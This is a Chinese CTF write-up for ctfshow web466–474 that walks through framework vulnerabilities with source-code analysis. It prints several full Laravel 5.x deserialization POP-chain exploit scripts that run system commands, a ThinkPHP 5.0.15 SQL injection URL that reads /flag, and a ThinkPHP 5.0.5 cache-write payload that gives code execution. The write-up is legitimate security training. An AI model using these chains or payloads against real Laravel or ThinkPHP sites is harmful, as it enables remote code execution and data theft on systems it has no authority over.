---
title: ctfshow入门框架复现
date: 2026-06-20T12:07:43+08:00
lastmod: 2026-06-20T12:07:43+08:00
summary:
url: /posts/ctfshow入门框架复现/
categories:
  - ctfshow
tags:
  - 框架复现
draft: false
---
# web466

## \#Laravel5.4反序列化

```
Laravel5.4版本 ，提交数据需要base64编码
```

这种多半都是框架反序列化的漏洞，本地搭一个Laravel5.4来分析一下

## 部署环境

```bash
composer create-project laravel/laravel=5.4 Laravel5.4 --prefer-dist --ignore-platform-reqs --no-security-blocking

cd Laravel5.4

php artisan key:generate

php artisan serve
```

由于laravel5.4是比较老的版本且存在安全漏洞，所以composer会默认阻止安装，需要带上`--ignore-platform-reqs --no-security-blocking`

![](image/Pasted%20image%2020260620123531.png)

前面会有一个报错导致无法正常运行，这是因为加入上面两个参数后会导致composer自己下一些php8.x新版本的依赖包，需要修改 platform_check.php 文件

![](image/Pasted%20image%2020260620123732.png)

后面访问8000端口就可以了

在项目中添加一个反序列化路由和控制器

在`routes/web.php`中添加

```php
Route::get('/seri',"SeriController@index");
```

新建`app/Http/Controllers/SeriController.php`

```php
<?php  
namespace App\Http\Controllers;  
  
class SeriController extends Controller{  
    public function index(){  
        if(isset($_GET['ser'])){  
            $ser = $_GET['ser'];  
            unserialize($ser);  
        }  
        else{  
            highlight_file(__FILE__);  
        }  
          
        return "Debug Laravel5.4 by yourself!";  
    }  
}
?>
```

配置一下xdebug，方便后面调试链子

## 漏洞分析

### `__destruct()`方法寻找

先找找可用的`__destruct()`方法

看到`\Illuminate\Broadcasting\PendingBroadcast::__destruct()`

```php
public function __destruct()  
{  
    $this->events->dispatch($this->event);  
}
```

`$this->events`和`$this->event`两个参数都是可控的，找一个不存在dispatch方法的类可以触发`__call()`

### 链1

#### Generator::\_\_call方法

全局搜索一下`__call()`方法，找到一个之前yii框架类似的`\Faker\Generator::__call`

```php
public function __call($method, $attributes)  
{  
    return $this->format($method, $attributes);  
}

跟进format
public function format($formatter, $arguments = array())  
{  
    return call_user_func_array($this->getFormatter($formatter), $arguments);  
}
```

看看getFormatter函数是干啥的

```php
public function getFormatter($formatter)  
{  
    if (isset($this->formatters[$formatter])) {  
        return $this->formatters[$formatter];  
    }  
    foreach ($this->providers as $provider) {  
        if (method_exists($provider, $formatter)) {  
            $this->formatters[$formatter] = array($provider, $formatter);  
  
            return $this->formatters[$formatter];  
        }  
    }  
    throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));  
}
```

分别从缓存中，每个provider对象中查找是否存在该方法，存在就缓存下来并返回，否则抛出异常

不过`$this->formatters`是可控的，配置一个dispatch指向system函数就行了

#### POC1编写

```php
<?php  
  
namespace Illuminate\Broadcasting{  
    use Faker\Generator;  
    class PendingBroadcast{  
        protected $event;  
        protected $events;  
  
        public function __construct($cmd)  
        {  
            $this -> event = $cmd;  
            $this -> events = new Generator();  
        }  
    }  
}  
namespace Faker{  
    class Generator{  
        protected $formatters;  
        public function __construct(){  
            $this->formatters = array('dispatch' => 'system');  
        }  
    }  
}  
  
namespace Illuminate\Broadcasting{  
    $ser = new PendingBroadcast("whoami");  
    echo urlencode(serialize($ser));  
}
```

不过直接传会出现这个报错

![](image/Pasted%20image%2020260621141026.png)

这是因为Generator类中有一个`__wakeup()`方法（FakerPHP v1.12.1 之后，Generator.php 中加了` __wakeup() 方法`）

![](image/Pasted%20image%2020260621141142.png)

可以用fast-destruct去进行绕过，构造一个错误的序列化字符串就可以了

我这里删除了末尾的一个花括号

![](image/Pasted%20image%2020260621142502.png)

在题目中也是可以打通的

#### 最终exp1

```php
<?php  
  
namespace Illuminate\Broadcasting{  
    use Faker\Generator;  
    class PendingBroadcast{  
        protected $event;  
        protected $events;  
  
        public function __construct($cmd)  
        {  
            $this -> event = $cmd;  
            $this -> events = new Generator();  
        }  
    }  
}  
namespace Faker{  
    class Generator{  
        protected $formatters;  
        public function __construct(){  
            $this->formatters = array('dispatch' => 'system');  
        }  
    }  
}  
  
namespace Illuminate\Broadcasting{  
    $ser = serialize(new PendingBroadcast("tac /flag"));  
    $poc = substr($ser, 0, -1);  
    echo base64_encode($poc);  
}
```

#### 另一条路

从上面可以看到Generator方法中的wakeup方法会清空$formatters，而在getFormatter方法中分析发现后面还会检查每个provider对象中是否存在dispatch方法，那我们是否能将计就计找个存在dispatch方法的类去达到RCE的效果呢？有的兄弟有的

在\Illuminate\Bus\Dispatcher类的dispatch方法中

```php
public function dispatch($command)  
{  
    if ($this->queueResolver && $this->commandShouldBeQueued($command)) {  
        return $this->dispatchToQueue($command);  
    } else {  
        return $this->dispatchNow($command);  
    }  
}
```

跟进commandShouldBeQueued函数

```php
protected function commandShouldBeQueued($command)  
{  
    return $command instanceof ShouldQueue;  
}
```

要求传入的command（也就是一开始的event）必须是实现了 `ShouldQueue` 的类

随后调用dispatchToQueue方法

```php
public function dispatchToQueue($command)  
{  
    $connection = isset($command->connection) ? $command->connection : null;  
  
    $queue = call_user_func($this->queueResolver, $connection);  
  
    if (! $queue instanceof Queue) {  
        throw new RuntimeException('Queue resolver did not return a Queue implementation.');  
    }  
  
    if (method_exists($command, 'queue')) {  
        return $command->queue($queue, $command);  
    } else {  
        return $this->pushCommandToQueue($queue, $command);  
    }  
}
```

有一个call_user_func函数，其中queueResolver参数是可控的，connection参数意味着我们需要找这么一个类：

- 这个类实现了 `ShouldQueue` 的类
- 这个类中有connection属性且可控

最终找到了一个`\Illuminate\Broadcasting\BroadcastEvent`类

![](image/Pasted%20image%2020260621154652.png)

这里use Queueable跟进看看

![](image/Pasted%20image%2020260621154822.png)

确实是有一个`$connection`

最终可以写出一个exp

#### 最终exp2

```php
<?php  
  
namespace Illuminate\Contracts\Queue{  
    interface ShouldQueue{}  
}  
  
namespace Illuminate\Broadcasting{  
    use Faker\Generator;  
  
    class PendingBroadcast{  
        protected $event;  
        protected $events;  
  
        public function __construct($cmd)  
        {  
            $this->event = new BroadcastEvent($cmd);  
  
            // 触发Faker\Generator的__call  
            $this->events = new Generator();  
        }  
    }  
  
    class BroadcastEvent implements \Illuminate\Contracts\Queue\ShouldQueue{  
        public $connection;  
  
        public function __construct($cmd)  
        {  
            $this->connection = $cmd;  
        }  
    }  
}  
  
namespace Illuminate\Bus{  
    class Dispatcher{  
        protected $queueResolver;  
  
        public function __construct()  
        {  
            $this->queueResolver = 'system';  
        }  
    }  
}  
  
namespace Faker{  
    class Generator{  
        protected $providers;  
        public function __construct(){  
            // 这里必须是对象，不是类名  
            $this->providers = array(new \Illuminate\Bus\Dispatcher());  
        }  
    }  
}  
  
namespace {  
    $ser = new \Illuminate\Broadcasting\PendingBroadcast("whoami");  
    echo urlencode(serialize($ser));  
}
```

![](image/Pasted%20image%2020260621160640.png)

另外还有一个类`\Illuminate\Foundation\Console\QueuedCommand`里面Use了一个Queueable，这个类中有`$connection`参数

#### 最终exp2plus

```php
<?php  
  
# POP Gadget:  
# \Illuminate\Broadcasting\PendingBroadcast::__destruct()->\Illuminate\Bus\Dispatcher::dispatch()  
# \Illuminate\Foundation\Console\QueuedCommand作为引入ShouldQueue接口的类传入event参数  
  
namespace Illuminate\Broadcasting{  
  
    use Illuminate\Bus\Dispatcher;  
    use Illuminate\Foundation\Console\QueuedCommand;  
  
    class PendingBroadcast  
    {  
        protected $events;  
        protected $event;  
        public function __construct($cmd){  
            $this->events=new Dispatcher();  
            $this->event=new QueuedCommand($cmd);  
        }  
    }  
}  
namespace Illuminate\Foundation\Console{  
    class QueuedCommand  
    {  
        public $connection;  
        public function __construct($cmd){  
            $this->connection=$cmd;  
        }  
    }  
}  
namespace Illuminate\Bus{  
    class Dispatcher  
    {  
        protected $queueResolver="system";  
  
    }  
}  
namespace{  
  
    use Illuminate\Broadcasting\PendingBroadcast;  
  
    echo base64_encode(serialize(new PendingBroadcast("whoami")));  
}
```


当然直接触发\Illuminate\Bus\Dispatcher类的dispatch方法也是可以的

#### 最终exp2plus2

```php
<?php  
namespace Illuminate\Contracts\Queue{  
    interface ShouldQueue{}  
}  
namespace Illuminate\Broadcasting{  
  
    use Illuminate\Bus\Dispatcher;  
  
    class PendingBroadcast  
    {  
        protected $events;  
        protected $event;  
        public function __construct($cmd){  
            $this->events=new Dispatcher();  
            $this->event = new BroadcastEvent($cmd);  
        }  
    }  
    class BroadcastEvent implements \Illuminate\Contracts\Queue\ShouldQueue{  
        public $connection;  
  
        public function __construct($cmd)  
        {  
            $this->connection = $cmd;  
        }  
    }  
}  
  
namespace Illuminate\Bus{  
    class Dispatcher{  
        protected $queueResolver;  
  
        public function __construct()  
        {  
            $this->queueResolver = 'system';  
        }  
    }  
}  
namespace{  
  
    use Illuminate\Broadcasting\PendingBroadcast;  
  
    echo base64_encode(serialize(new PendingBroadcast("whoami")));  
}
```

继续找找别的链子
### 链2
#### Manager::\_\_call方法

看到`\Illuminate\Support\Manager::__call`方法中

```php
public function __call($method, $parameters)  
{  
    return $this->driver()->$method(...$parameters);  
}
```

跟进driver方法

```php
public function driver($driver = null)  
{  
    $driver = $driver ?: $this->getDefaultDriver();  
  
    // If the given driver has not been created before, we will create the instances  
    // here and cache it so we can return it next time very quickly. If there is    // already a driver created by this name, we'll just return that instance.    if (! isset($this->drivers[$driver])) {  
        $this->drivers[$driver] = $this->createDriver($driver);  
    }  
  
    return $this->drivers[$driver];  
}
```

跟进createDriver方法

```php
protected function createDriver($driver)  
{  
    // We'll check to see if a creator method exists for the given driver. If not we  
    // will check for a custom driver creator, which allows developers to create    // drivers using their own customized driver creator Closure to create it.    if (isset($this->customCreators[$driver])) {  
        return $this->callCustomCreator($driver);  
    } else {  
        $method = 'create'.Str::studly($driver).'Driver';  
  
        if (method_exists($this, $method)) {  
            return $this->$method();  
        }  
    }  
    throw new InvalidArgumentException("Driver [$driver] not supported.");  
}
```

跟进callCustomCreator方法发现可变函数数组的调用，其中`$this->customCreators`和`$this->app`可控

```php
protected function callCustomCreator($driver)  
{  
    return $this->customCreators[$driver]($this->app);  
}
```

回去看一下`$driver`咋来的

```php
$driver = $driver ?: $this->getDefaultDriver();
abstract public function getDefaultDriver();
```

`getDefaultDriver()`方法是一个 `abstract` 抽象方法，找重写该方法的继承子类

在`\Illuminate\Notifications\ChannelManager::getDefaultDriver`中

```php
public function getDefaultDriver()  
{  
    return $this->defaultChannel;  
}
```

defaultChannel可控，那么driver也就可控了

#### 最终exp3

```php
<?php  
  
namespace Illuminate\Broadcasting{  
    use Illuminate\Notifications\ChannelManager;  
    class PendingBroadcast{  
        protected $events;  
  
        public function __construct($cmd)  
        {  
            $this -> events = new ChannelManager($cmd);  
        }  
    }  
}  
namespace Illuminate\Notifications{  
    class ChannelManager  
    {  
        protected $app;  
        protected $defaultChannel;  
        protected $customCreators;  
        public function __construct($cmd)  
        {  
            $this->defaultChannel = 'wanth3f1ag';  
            $this->customCreators = array('wanth3f1ag' => 'system');  
            $this->app = $cmd;  
        }  
    }  
}  
  
namespace {  
    $ser = new Illuminate\Broadcasting\PendingBroadcast("whoami");  
    echo base64_encode(serialize($ser));  
}
```

### 链3

#### ValidGenerator::\_\_call方法

```php
public function __call($name, $arguments)  
{  
    $i = 0;  
    do {  
        $res = call_user_func_array(array($this->generator, $name), $arguments);  
        $i++;  
        if ($i > $this->maxRetries) {  
            throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));  
        }  
    } while (!call_user_func($this->validator, $res));  
  
    return $res;  
}
```

`$this->generator，$this->validator和$this->maxRetries`都是可控的，但是这里name不可控，由于do-while语句必须会执行一次循环代码块，所以为了让`$res`的值可控，要找到一个`__call()`方法能返回可控字符且没有dispatch方法的对象，然后令`$this->generator`等于这个对象，即可控制`$res`

找到一个src/Faker/DefaultGenerator.php

```php
public function __call($method, $attributes)  
{  
    return $this->default;  
}
```

`$this->default`是可控的，那么可以写出exp
#### 最终exp4

```php
<?php  
  
namespace Illuminate\Broadcasting{  
    use Faker\ValidGenerator;  
    class PendingBroadcast{  
        protected $events;  
  
        public function __construct($cmd)  
        {  
            $this -> events = new ValidGenerator($cmd);  
        }  
    }  
}  
namespace Faker{  
    use Faker\DefaultGenerator;  
    class ValidGenerator  
    {  
        protected $generator;  
        protected $validator;  
        protected $maxRetries;  
        public function __construct($cmd)  
        {  
            $this->generator = new DefaultGenerator($cmd);  
            $this->validator = 'system';  
            $this->maxRetries = 100000;  
        }  
    }  
}  
namespace Faker  
{  
    class DefaultGenerator  
    {  
        protected $default;  
        public function __construct($cmd)  
        {  
            $this->default = $cmd;  
        }  
    }  
}  
  
namespace {  
    $ser = new Illuminate\Broadcasting\PendingBroadcast("whoami");  
    echo base64_encode(serialize($ser));  
}
```

# web467

## \#Laravel5.5反序列化

用exp4可以做，其他三个都不行

不过还有一条直接用PendingBroadcast的`__destruct`方法触发dispatch的链子也是可以的

## 链子分析

### \Events\Dispatcher::dispatch方法

在Illuminate\Events\Dispatcher的dispatch方法中

```php
    public function dispatch($event, $payload = [], $halt = false)
    {
        // When the given "event" is actually an object we will assume it is an event
        // object and use the class as the event name and this event itself as the
        // payload to the handler, which makes object based events quite simple.
        list($event, $payload) = $this->parseEventAndPayload(
            $event, $payload
        );

        if ($this->shouldBroadcast($payload)) {
            $this->broadcastEvent($payload[0]);
        }

        $responses = [];

        foreach ($this->getListeners($event) as $listener) {
            $response = $listener($event, $payload);

            // If a response is returned from the listener and event halting is enabled
            // we will just return this response, and not call the rest of the event
            // listeners. Otherwise we will add the response on the response list.
            if ($halt && ! is_null($response)) {
                return $response;
            }

            // If a boolean false is returned from a listener, we will stop propagating
            // the event to any further listeners down in the chain, else we keep on
            // looping through the listeners and firing every one in our sequence.
            if ($response === false) {
                break;
            }

            $responses[] = $response;
        }

        return $halt ? null : $responses;
    }
```

又是可变函数数组的调用，看看参数是否可控，跟进parseEventAndPayload方法

```php
protected function parseEventAndPayload($event, $payload)  
{  
    if (is_object($event)) {  
        list($payload, $event) = [[$event], get_class($event)];  
    }  
  
    return [$event, array_wrap($payload)];  
}
```

`$payload`不是我们传入的值，所以并不可控

跟进getListeners方法

```php
public function getListeners($eventName)  
{  
    $listeners = isset($this->listeners[$eventName]) ? $this->listeners[$eventName] : [];  
  
    $listeners = array_merge(  
        $listeners, $this->getWildcardListeners($eventName)  
    );  
  
    return class_exists($eventName, false)  
                ? $this->addInterfaceListeners($eventName, $listeners)  
                : $listeners;  
}
```

`$listeners`是可控的，getWildcardListeners函数的操作不需要在意，我们只需要控制$listeners就行

后面的`$response = $listener($event, $payload);`就一目了然了，而且`system` 支持两个参数

## 最终exp5

```php
<?php
namespace Illuminate\Broadcasting
{
    use  Illuminate\Events\Dispatcher;
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($cmd)
        {
            $this->events = new Dispatcher($cmd);
            $this->event=$cmd;
        }
    }
    echo base64_encode(serialize(new PendingBroadcast($argv[1])));
}

namespace Illuminate\Events
{
    class Dispatcher
    {
       protected $listeners;
       public function __construct($event){
           $this->listeners=[$event=>['system']];
       }
    }
}
```

# web468

## \#Laravel5.5反序列化

这道题用exp3或者exp4就行

# web469-web470

## \#Laravel5.5反序列化

可以用exp4

# web471

## \#Laravel5.8反序列化

之前触发dispatch方法的链子都是可以的

# web472

## \#Laravel8.1反序列化

其实也一样的，上面的链子中也有可以打的

我一直很好奇为什么官方这么多版本都没修复，问claude搜索后给出来的答案是这样的：

Laravel 的开发团队在被安全研究人员就 POP 链问题告知后，明确表示**不打算修复 Gadget Chain**，其理由是：漏洞的根源在于应用程序对不可信用户输入调用了 `unserialize()`，而这不是框架本身的责任，比如CVE-2018-15133中攻击者可通过对不可信的 `X-XSRF-TOKEN` 值调用 `unserialize`，触发远程代码执行，官方也只是修复 X-XSRF-TOKEN 反序列化入口

# web473

## \#thinkphp5.0.15 SQL类型转换报错注入

给了一个默认路由

```php
public function inject(){
     $a=request()->get('a/a');
     db('users')->insert(['username'=>$a]);
     return 'done';
    
    }
```

典型的sql注入，直接将此参数传入insert语句，这里的`a/a`，第一个a是get参数，第二个a是过滤规则：FILTER_SANITIZE_SPECIAL_CHARS

## 部署thinkphp5.0.15环境

```bash
composer create-project --prefer-dist topthink/think=5.0.15 thinkphp5.0.15

cd thinkphp5.0.15

# 强制锁定框架核心到5.0.15
composer require topthink/framework=5.0.15 --no-audit
```

因为topthink/think=5.0.15只是**外层项目骨架**的版本，真正框架核心是topthink/framework，所以需要修改一下核心框架版本

 随后用phpstorm打开tp项目并创建一样的控制器

```php
<?php  
namespace app\index\controller;  
  
class Test  
{  
    public function Test()  
    {  
        $username = request()->get('username/a');  
        $res = db('users')->insert(['username' => $username]);  
        var_dump($res);  
        return 'done';  
    }  
}
```

route.php下创建路由

```php
'test' => 'Test/Test',
```

后面还需要配置mysql数据库连接，自己配上就行了

## 代码分析

在`$username = request()->get('username/a');`中，request()是获取一个request对象实例，我们跟进get()方法看看

```php
/**  
 * 设置获取GET参数  
 * @access public  
 * @param string|array  $name 变量名  
 * @param mixed         $default 默认值  
 * @param string|array  $filter 过滤方法  
 * @return mixed  
 */public function get($name = '', $default = null, $filter = '')  
{  
    if (empty($this->get)) {  
        $this->get = $_GET;  
    }  
    if (is_array($name)) {  
        $this->param      = [];  
        return $this->get = array_merge($this->get, $name);  
    }  
    return $this->input($this->get, $name, $default, $filter);  
}
```

`username/a`作为name参数传入，随后进入input函数

```php
    public function input($data = [], $name = '', $default = null, $filter = '')
    {
        if (false === $name) {
            // 获取原始数据
            return $data;
        }
        $name = (string) $name;
        if ('' != $name) {
            // 解析name
            if (strpos($name, '/')) {
                list($name, $type) = explode('/', $name);
            } else {
                $type = 's';
            }
            // 按.拆分成多维数组进行判断
            foreach (explode('.', $name) as $val) {
                if (isset($data[$val])) {
                    $data = $data[$val];
                } else {
                    // 无输入数据，返回默认值
                    return $default;
                }
            }
            if (is_object($data)) {
                return $data;
            }
        }

        // 解析过滤器
        $filter = $this->getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            reset($data);
        } else {
            $this->filterValue($data, $name, $filter);
        }

        if (isset($type) && $data !== $default) {
            // 强制类型转换
            $this->typeCast($data, $type);
        }
        return $data;
    }
```

解析name参数，通过`/`将name参数分开，a作为type类型，随后会根据type对data进行强制类型转换，跟进typeCast能看到a表示的是array数组类型

get()调用后会进入`db('users')->insert(['username' => $username])`

```php
    function db($name = '', $config = [], $force = false)
    {
        return Db::connect($config, $force)->name($name);
    }
```

指定了要操作的表的表名是users

然后我们来看sql语句执行部分，进入insert方法

```php
    /**
     * 插入记录
     * @access public
     * @param mixed   $data         数据
     * @param boolean $replace      是否replace
     * @param boolean $getLastInsID 返回自增主键
     * @param string  $sequence     自增序列名
     * @return integer|string
     */
    public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)
    {
        // 分析查询表达式
        $options = $this->parseExpress();
        $data    = array_merge($options['data'], $data);
        // 生成SQL语句
        $sql = $this->builder->insert($data, $options, $replace);
        // 获取参数绑定
        $bind = $this->getBind();
        if ($options['fetch_sql']) {
            // 获取实际执行的SQL语句
            return $this->connection->getRealSql($sql, $bind);
        }

        // 执行操作
        $result = 0 === $sql ? 0 : $this->execute($sql, $bind);
        if ($result) {
            $sequence  = $sequence ?: (isset($options['sequence']) ? $options['sequence'] : null);
            $lastInsId = $this->getLastInsID($sequence);
            if ($lastInsId) {
                $pk = $this->getPk($options);
                if (is_string($pk)) {
                    $data[$pk] = $lastInsId;
                }
            }
            $options['data'] = $data;
            $this->trigger('after_insert', $options);

            if ($getLastInsID) {
                return $lastInsId;
            }
        }
        return $result;
    }
```

跟进`$this->builder->insert($data, $options, $replace);`生成语句

在`thinkphp/library/think/db/Builder::insert`方法

```php
/**  
 * 生成insert SQL  
 * @access public  
 * @param array     $data 数据  
 * @param array     $options 表达式  
 * @param bool      $replace 是否replace  
 * @return string  
 */public function insert(array $data, $options = [], $replace = false)  
{  
    // 分析并处理数据  
    $data = $this->parseData($data, $options);  
    if (empty($data)) {  
        return 0;  
    }  
    $fields = array_keys($data);  
    $values = array_values($data);  
  
    $sql = str_replace(  
        ['%INSERT%', '%TABLE%', '%FIELD%', '%DATA%', '%COMMENT%'],  
        [  
            $replace ? 'REPLACE' : 'INSERT',  
            $this->parseTable($options['table'], $options),  
            implode(' , ', $fields),  
            implode(' , ', $values),  
            $this->parseComment($options['comment']),  
        ], $this->insertSql);  
  
    return $sql;  
}
```

首先是解析数据，会分离出字段和值，最后用str_replace()拼接关键词，构造最终的sql语句。

跟进parseData解析函数

```php
    protected function parseData($data, $options)
    {
        if (empty($data)) {
            return [];
        }

        // 获取绑定信息
        $bind = $this->query->getFieldsBind($options['table']);
        if ('*' == $options['field']) {
            $fields = array_keys($bind);
        } else {
            $fields = $options['field'];
        }

        $result = [];
        foreach ($data as $key => $val) {
            $item = $this->parseKey($key, $options);
            if (is_object($val) && method_exists($val, '__toString')) {
                // 对象数据写入
                $val = $val->__toString();
            }
            if (false === strpos($key, '.') && !in_array($key, $fields, true)) {
                if ($options['strict']) {
                    throw new Exception('fields not exists:[' . $key . ']');
                }
            } elseif (is_null($val)) {
                $result[$item] = 'NULL';
            } elseif (is_array($val) && !empty($val)) {
                switch ($val[0]) {
                    case 'exp':
                        $result[$item] = $val[1];
                        break;
                    case 'inc':
                        $result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
                        break;
                    case 'dec':
                        $result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
                        break;
                }
            } elseif (is_scalar($val)) {
                // 过滤非标量数据
                if (0 === strpos($val, ':') && $this->query->isBind(substr($val, 1))) {
                    $result[$item] = $val;
                } else {
                    $key = str_replace('.', '_', $key);
                    $this->query->bind('data__' . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR);
                    $result[$item] = ':data__' . $key;
                }
            }
        }
        return $result;
    }
```

重点关注数组部分的处理

```php
switch ($val[0]) {
	case 'exp':
		$result[$item] = $val[1];
		break;
	case 'inc':
		$result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
		break;
	case 'dec':
		$result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
		break;
}
```

如果`$val[0]`是exp的话就直接返回`$val[1]`，如果是inc的话就调用parseKey()对`$key[1]`进行处理，并用加号和`$val[2]`进行拼接后返回

### 漏洞原理

需要注意的是，在进行拼接后，MySQL看到 字符串 + 数字 这个表达式时，会自动尝试把字符串转换为double类型 来完成加法运算，所以会产生类型转换错误导致报错注入

其实parseKey函数也没做啥处理，是直接返回值的

![](image/Pasted%20image%2020260623171522.png)

回到insert函数，生成的`$data`大致是`['username'=>'xxx']`的格式

最后生成sql语句的部分

```php
    $sql = str_replace(  
        ['%INSERT%', '%TABLE%', '%FIELD%', '%DATA%', '%COMMENT%'],  
        [  
            $replace ? 'REPLACE' : 'INSERT',  
            $this->parseTable($options['table'], $options),  
            implode(' , ', $fields),  
            implode(' , ', $values),  
            $this->parseComment($options['comment']),  
        ], $this->insertSql); 
        
protected $insertSql    = '%INSERT% INTO %TABLE% (%FIELD%) VALUES (%DATA%) %COMMENT%'; 
```

生成的sql语句大致是这样的

```php
INSERT INITO user ('username') VALUES ('xxx') 
```

可以看到这里是直接替换值进去的，并没有进行预编译或者参数绑定的操作，所以存在SQL注入

## 最终EXP

```php
?a[0]=inc&a[1]=(select load_file('/flag'))&a[2]=1
```

根据ThinkPHP 5.0 默认的URL格式：

```
/index.php/模块/控制器/方法?参数
或
/index.php?s=模块/控制器/方法&参数
```

改一下exp

```php
/index.php?s=index/index/inject&a[0]=inc&a[1]=(select%20load_file(%27/flag%27))&a[2]=1
或者
/index.php?s=index/index/inject?a[0]=dec&a[1]=(select%20load_file(%27/flag%27))&a[2]=1
```

## 官方修复5.0.16

```php
switch (strtolower($val[0])) {
	case 'inc':
		if ($key == $val[1]) {
		$result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
		}
		break;
	case 'dec':
		if ($key == $val[1]) {
		$result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
		}
		break;
	case 'exp':
		$result[$item] = $val[1];
		break
}

```

固定了`$val[1]`的值需要为key键名
# web474

## \#thinkphp5.0.5 缓存文件写入

```php
 public function rce(){
        Cache::set("cache",input('get.cache'));
        return 'done';
    }
```

写个控制器

```php
<?php
namespace app\index\controller;
use think\Cache;
class Test
{
    public function rce(){
        Cache::set("cache",input('get.cache'));
        return 'done';
    }
}
```

路由记得同步改一下
## 代码分析

跟进input函数

```php
    function input($key = '', $default = null, $filter = '')
    {
        if (0 === strpos($key, '?')) {
            $key = substr($key, 1);
            $has = true;
        }
        if ($pos = strpos($key, '.')) {
            // 指定参数来源
            list($method, $key) = explode('.', $key, 2);
            if (!in_array($method, ['get', 'post', 'put', 'patch', 'delete', 'route', 'param', 'request', 'session', 'cookie', 'server', 'env', 'path', 'file'])) {
                $key    = $method . '.' . $key;
                $method = 'param';
            }
        } else {
            // 默认为自动判断
            $method = 'param';
        }
        if (isset($has)) {
            return request()->has($key, $method, $default);
        } else {
            return request()->$method($key, $default, $filter);
        }
    }
```

get.cache在这里的意思就是从GET里面取cache参数

跳出并跟进`Cache::set`函数

```php
public static function set($name, $value, $expire = null)  
{  
    self::$writeTimes++;  
  
    return self::init()->set($name, $value, $expire);  
}
```

`writeTimes`参数表示缓存写入次数，初始是0

先跟进init初始化代码

```php
    /**
     * 自动初始化缓存
     * @access public
     * @param  array $options 配置数组
     * @return Driver
     */
    public static function init(array $options = [])
    {
        if (is_null(self::$handler)) {
            if (empty($options) && 'complex' == Config::get('cache.type')) {
                $default = Config::get('cache.default');
                // 获取默认缓存配置，并连接
                $options = Config::get('cache.' . $default['type']) ?: $default;
            } elseif (empty($options)) {
                $options = Config::get('cache');
            }

            self::$handler = self::connect($options);
        }

        return self::$handler;
    }
```

![](image/Pasted%20image%2020260623181948.png)

cache默认缓存类型是File，跟进connect函数

```php
  public static function connect(array $options = [], $name = false)
    {
        $type = !empty($options['type']) ? $options['type'] : 'File';

        if (false === $name) {
            $name = md5(serialize($options));
        }

        if (true === $name || !isset(self::$instance[$name])) {
            $class = false === strpos($type, '\\') ?
            '\\think\\cache\\driver\\' . ucwords($type) :
            $type;

            // 记录初始化信息
            App::$debug && Log::record('[ CACHE ] INIT ' . $type, 'info');

            if (true === $name) {
                return new $class($options);
            }

            self::$instance[$name] = new $class($options);
        }

        return self::$instance[$name];
    }
```

会加载`\\think\\cache\\driver\\file.php`也就是File对象并返回，所以其实调用的是File对象的set方法

```php
    public function set($name, $value, $expire = null)
    {
        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }
        if ($expire instanceof \DateTime) {
            $expire = $expire->getTimestamp() - time();
        }
        $filename = $this->getCacheKey($name, true);
        if ($this->tag && !is_file($filename)) {
            $first = true;
        }
        $data = serialize($value);
        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }
        $data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);
        if ($result) {
            isset($first) && $this->setTagItem($filename);
            clearstatcache();
            return true;
        } else {
            return false;
        }
    }
```

`$expire`缓存有效期取自配置文件中expire字段的值

`$filename = $this->getCacheKey($name, true);`这里会生成缓存文件名，跟进看看

```php
    /**
     * 取得变量的存储文件名
     * @access protected
     * @param  string $name 缓存变量名
     * @param  bool   $auto 是否自动创建目录
     * @return string
     */
    protected function getCacheKey($name, $auto = false)
    {
        $name = md5($name);
        if ($this->options['cache_subdir']) {
            // 使用子目录
            $name = substr($name, 0, 2) . DS . substr($name, 2);
        }
        if ($this->options['prefix']) {
            $name = $this->options['prefix'] . DS . $name;
        }
        $filename = $this->options['path'] . $name . '.php';
        $dir      = dirname($filename);

        if ($auto && !is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        return $filename;
    }
```

name会进行一次md5加密，cache_subdir默认是true，所以会进入if语句，生成name文件子目录名大致是这样的：`[变量名md5的前两位]\[变量名md5第二位之后的值]`

path字段取自CACHE_PATH

```php
defined('CACHE_PATH') or define('CACHE_PATH', RUNTIME_PATH . 'cache' . DS);
defined('RUNTIME_PATH') or define('RUNTIME_PATH', ROOT_PATH . 'runtime' . DS);
defined('ROOT_PATH') or define('ROOT_PATH', dirname(realpath(APP_PATH)) . DS);
defined('APP_PATH') or define('APP_PATH', dirname($_SERVER['SCRIPT_FILENAME']) . DS);
```

最终的文件保存路径就是`项目根目录\runtime\cache\[变量名md5的前两位]\[变量名md5第二位之后的值].php`

所以不难看出其实这里缓存路径是可推测出来的，而且创建目录的权限是0755，存在可执行权限

回到set函数，生成文件名后会对内容进行一次序列化操作

```php
$data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
$result = file_put_contents($filename, $data);
```

`$expire`是空，所以生成的data是这样的：

```php
<?php
//
exit();?>
序列化的内容
```

随后调用file_put_contents函数写入内容

## 解题步骤

首先是缓存文件保存路径（set的key是cache，md5值是0fea6a13c52b4d4725368f24b045ca84）

```php
项目根目录/runtime/cache/0f/ea6a13c52b4d4725368f24b045ca84.php
```

然后就是写入缓存文件，需要绕过exit()

额做到这我发现版本错了，题目的版本是5.0.5，我分析的是5.0.15，在tp5.0.10 之前data的赋值代码是这样的：

```php
$data   = "<?php\n//" . sprintf('%012d', $expire) . $data . "\n?>";
```

那么就不需要绕过了，直接打

```http
/public/index.php?s=index/index/rce&cache=%0d%0asystem('cat /flag');//
```

```php
<?php
//s:21:"
system('cat /flag');//";

```

需要注意这里末尾要加上一个`//`注释符，否则php语法会出错(序列化字符串长度会由于`%0d%0a`而不匹配，所以需要//注释掉末尾的`",`从而使得这串序列化字符串失效)

